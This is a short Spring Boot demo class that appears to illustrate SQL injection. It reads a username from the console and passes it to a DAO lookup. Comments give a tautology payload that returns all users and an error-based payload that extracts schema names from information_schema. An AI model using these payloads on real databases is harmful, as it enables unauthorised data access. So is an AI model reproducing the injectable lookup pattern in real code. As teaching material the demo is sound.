package com.example.demo;

import com.example.demo.dao.UserDAO;
import com.example.demo.dao.UserDAOJdbcTemplate;
import com.example.demo.model.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.util.Scanner;

@SpringBootApplication(scanBasePackages = "com.example.demo")

public class DemoApplication implements CommandLineRunner {

	@Autowired
	UserDAO dao;
	@Autowired
	UserDAOJdbcTemplate daoo;
	public static void main(String[] args) {
		SpringApplication.run(DemoApplication.class, args);
	}

	@Override
	public void run(String... args) throws Exception {
		Scanner sc = new Scanner(System.in);
		System.out.println("Enter username");
		String name = sc.nextLine();
//		for (User user : dao.getUserByName(name)) {
//			System.out.println(user);
//		}
		for (User user : daoo.findCategoryByName(name)) {
			System.out.println(user);
		}
		// enter " ' or ''=' " for all user
		// enter " ' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
	}
}
